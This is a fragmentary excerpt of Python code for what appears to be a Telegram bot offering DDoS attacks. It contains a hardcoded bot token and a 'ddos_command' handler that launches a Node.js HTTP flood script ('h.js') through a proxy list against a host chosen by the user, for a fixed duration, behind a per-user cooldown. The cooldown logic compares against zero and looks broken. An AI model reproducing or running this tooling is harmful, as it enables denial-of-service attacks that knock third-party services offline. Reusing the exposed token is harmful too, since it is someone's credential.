...
bot_token = '7703825289:AAF_qs6DnlsvMgvOd_rEw-3cyyKx4Tq7xdA' 
...
def ddos_command(message):
    ...
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 0:
        remaining_time = int(0 - (current_time - cooldown_dict[username].get('attack', 0)))
    ...
    command = ["node", "h.js", "GET", host, "200", "8", "90", "proxy.txt"]
    duration = 200
